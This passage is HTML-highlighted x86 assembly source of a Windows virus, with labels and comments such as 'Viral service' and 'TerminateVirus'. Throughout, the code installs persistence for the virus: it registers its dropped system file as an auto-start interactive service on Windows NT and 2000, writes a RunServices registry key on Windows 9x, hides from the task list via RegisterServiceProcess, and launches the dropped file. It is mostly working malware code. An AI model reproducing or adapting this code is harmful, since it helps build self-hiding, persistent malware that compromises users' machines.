                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hViralService</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">ViralServiceAlreadyRegistered</span><span class="sc0">

                </span><span class="sc1">;By far the most common reason to manipulate</span><span class="sc0">
                </span><span class="sc1">;the SCM database is to add a service</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;To add a service, you must call</span><span class="sc0">
                </span><span class="sc1">;OpenSCManager, specifying the </span><span class="sc0">
                </span><span class="sc1">;SC_MANAGER_CREATE_SERVICE access, then call</span><span class="sc0">
                </span><span class="sc1">;CreateService</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;eax = 00000000h</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">;lpPassword </span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">;lpServiceStartName     </span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">;lpDependencies</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">;lpdwTagId</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">;lpLoadOrderGroup</span><span class="sc0">
                
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Path_VirusSystemFile</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">    </span><span class="sc1">;lpBinaryPathName</span><span class="sc0">
                
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">SERVICE_ERROR_NORMAL</span><span class="sc0"> </span><span class="sc1">;dwErrorControl</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">SERVICE_AUTO_START</span><span class="sc0">   </span><span class="sc1">;dwStartType</span><span class="sc0">

                </span><span class="sc1">;dwServiceType</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;The SERVICE_INTERACTIVE_PROCESS flag enables</span><span class="sc0">
                </span><span class="sc1">;a service application process to interact</span><span class="sc0">
                </span><span class="sc1">;with the desktop</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">SERVICE_WIN32_SHARE_PROCESS</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">SERVICE_INTERACTIVE_PROCESS</span><span class="sc0">
                
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">SERVICE_ALL_ACCESS</span><span class="sc0"> </span><span class="sc1">;dwDesiredAccess </span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">;lpDisplayName</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">        </span><span class="sc1">;lpServiceName</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hSCM</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;hSCManager </span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_CreateServiceA</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hViralService</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">EndScmSession</span><span class="sc0">

                </span><span class="sc1">;The StartService function starts a service</span><span class="sc0">
                </span><span class="sc1">;Do you belive it ?</span><span class="sc0">

</span><span class="sc5">ViralServiceAlreadyRegistered</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_StartServiceA</span><span class="sc4">]</span><span class="sc0">
                
                </span><span class="sc1">;Close virus service handle</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hViralService</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_CloseServiceHandle</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc1">;Close SCM handle</span><span class="sc0">

</span><span class="sc5">EndScmSession</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hSCM</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_CloseServiceHandle</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">TerminateVirus</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Windows 9x residency</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Register the virus application somewhere in WIN.INI or into registery (8-?</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">KEY_WRITE</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00020006h</span><span class="sc0">
</span><span class="sc5">REG_SZ</span><span class="sc0">              </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">000000001h</span><span class="sc0">

</span><span class="sc5">ThenItHaveToBe9x</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc1">;If it isnt Win9x or WinNT then leave...</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">VER_PLATFORM_WIN32_WINDOWS</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">TerminateVirus</span><span class="sc0">

                </span><span class="sc1">;Open *RunServices* registry key</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">hKey__RunServices</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">KEY_WRITE</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;REG_OPTION_NON_VOLATILE</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szWin9xKeyName</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">80000002h</span><span class="sc0">       </span><span class="sc1">;HKEY_LOCAL_MACHINE</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_RegOpenKeyExA</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">ExecuteFileAtSystemDir</span><span class="sc0">

                </span><span class="sc1">;Size of path ?</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Path_VirusSystemFile</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
</span><span class="sc5">GetSizeOfVirusPathLoop</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">GetSizeOfVirusPathLoop</span><span class="sc0">

                </span><span class="sc1">;Set key value</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">        </span><span class="sc1">;cbData</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">        </span><span class="sc1">;lpData</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">REG_SZ</span><span class="sc0">     </span><span class="sc1">;dwType</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">      </span><span class="sc1">;Reserved</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ViralServiceName</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">;lpValueName </span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;hKey </span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_RegSetValueExA</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc1">;Close the key</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hKey__RunServices</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_RegCloseKey</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Execute the file created at system directory</span><span class="sc0">
</span><span class="sc1">;Windows NT and Windows 2000 initialization should call this routine if</span><span class="sc0">
</span><span class="sc1">;service installation fails</span><span class="sc0">
</span><span class="sc1">;Windows 9x falls here after registry manipulation</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">CREATE_NEW_PROCESS_GROUP</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000200h</span><span class="sc0">

</span><span class="sc5">ExecuteFileAtSystemDir</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">STARTUPINFO</span><span class="sc4">],</span><span class="sc2">00000044h</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PROCESS_INFORMATION</span><span class="sc0">     </span><span class="sc1">;lpProcessInformation </span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">STARTUPINFO</span><span class="sc0">         </span><span class="sc1">;lpStartupInfo </span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;lpCurrentDirectory </span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;lpEnvironment </span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">CREATE_NEW_PROCESS_GROUP</span><span class="sc0">       </span><span class="sc1">;dwCreationFlags </span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;bInheritHandles </span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;lpThreadAttributes </span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;lpProcessAttributes </span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szCommandLine</span><span class="sc0">       </span><span class="sc1">;lpCommandLine </span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Path_VirusSystemFile</span><span class="sc0">    </span><span class="sc1">;lpApplicationName </span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_CreateProcessA</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Dis is the end</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">TerminateVirus</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc1">;Unload DLLs</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">UnloadDlls</span><span class="sc0">

                </span><span class="sc1">;Bye bye</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_ExitProcess</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Initialization: Virus is on system file</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">VirusOnSystem</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc1">;Running on Windows NT ?</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">system_version</span><span class="sc4">+</span><span class="sc2">00000010h</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">VER_PLATFORM_WIN32_NT</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">ViralServiceRunningOnWin9x</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Viral service running on Windows NT or Windows 2000</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

                </span><span class="sc1">;Check if we are running as a service or</span><span class="sc0">
                </span><span class="sc1">;as a normal application</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_GetCommandLineA</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
</span><span class="sc5">ScanCommandLine</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">RunningAsNtService</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'/'</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">ScanCommandLineNextChar</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">00000001h</span><span class="sc4">],</span><span class="sc12">'A92/'</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">ScanCommandLineNextChar</span><span class="sc0">

                </span><span class="sc1">;We are running here as a normal user application</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ServiceCommonPart</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">TerminateViralService</span><span class="sc0">

</span><span class="sc5">ScanCommandLineNextChar</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ScanCommandLine</span><span class="sc0">

</span><span class="sc5">RunningAsNtService</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc1">;The StartServiceCtrlDispatcher function</span><span class="sc0">
                </span><span class="sc1">;connects the main thread of a service </span><span class="sc0">
                </span><span class="sc1">;process to the service control manager, </span><span class="sc0">
                </span><span class="sc1">;which causes the thread to be the service </span><span class="sc0">
                </span><span class="sc1">;control dispatcher thread for the calling </span><span class="sc0">
                </span><span class="sc1">;process</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ServiceTable</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ViralServiceName</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ViralServiceMain</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_StartServiceCtrlDispatcherA</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Terminate viral service</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">TerminateViralService</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">UnloadDlls</span><span class="sc0">

                </span><span class="sc1">;Terminate viral service</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_ExitProcess</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Viral service control dispatcher</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">ViralServiceMain</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">pushad</span><span class="sc0">

                </span><span class="sc1">;A service application calls the</span><span class="sc0">
                </span><span class="sc1">;RegisterServiceCtrlHandler function to </span><span class="sc0">
                </span><span class="sc1">;register a function to handle its service </span><span class="sc0">
                </span><span class="sc1">;control requests</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ViralHandlerProc</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ViralServiceName</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_RegisterServiceCtrlHandlerA</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ExitServiceMain</span><span class="sc0">

                </span><span class="sc1">;The SetServiceStatus function updates the</span><span class="sc0">
                </span><span class="sc1">;service control manager's status information</span><span class="sc0">
                </span><span class="sc1">;for the calling service</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;Once a service is started, the service is</span><span class="sc0">
                </span><span class="sc1">;given 82 seconds to register a handler and</span><span class="sc0">
                </span><span class="sc1">;call SetServiceStatus for the first time</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ServiceStatusStructure</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_SetServiceStatus</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ExitServiceMain</span><span class="sc0">              

                </span><span class="sc1">;Launch debug thread</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ServiceCommonPart</span><span class="sc0">

</span><span class="sc5">ExitServiceMain</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">popad</span><span class="sc0">

                </span><span class="sc1">; Thanks to z0mbi3 for pointing me out</span><span class="sc0">
                </span><span class="sc1">; over this bug</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">; add esp,00000008h</span><span class="sc0">

                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Handle messages sent by system to viral service</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">ViralHandlerProc</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">00000004h</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Viral service running on Windows 9x</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">ViralServiceRunningOnWin9x</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">;Hide virus application from task list,</span><span class="sc0">
                </span><span class="sc1">;using RegisterServiceProcess</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hKERNEL32</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">00000001h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CRC__RegisterServiceProcess</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">a_RegisterServiceProcess</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_APIs</span><span class="sc0">
                </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">OK_RSP</span><span class="sc0">

                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ERROR_RSP</span><span class="sc0">

